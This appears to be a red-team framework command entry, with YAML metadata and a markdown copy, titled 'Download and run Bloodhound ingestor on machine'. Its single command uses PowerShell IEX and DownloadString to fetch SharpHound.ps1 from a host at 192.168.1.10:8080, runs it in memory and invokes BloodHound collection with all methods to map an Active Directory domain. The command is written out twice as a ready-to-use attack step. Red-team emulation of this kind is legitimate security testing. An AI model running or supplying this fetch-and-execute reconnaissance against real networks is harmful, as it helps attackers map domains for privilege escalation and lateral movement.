---
id: b90559fc-177a-4dfc-a7df-499e0744ba70
name: Download and run Bloodhound ingestor on machine
type: command
executor: bash
data: 'IEX(New-Object Net.Webclient).DownloadString(''http://192.168.1.10:8080/tools/ps/SharpHound.ps1'');Invoke-Bloodhound
  -CollectionMethod All

  '
output: null
created_at: '2020-07-15T19:05:44.361543+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Download and run Bloodhound ingestor on machine

```bash
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All

```


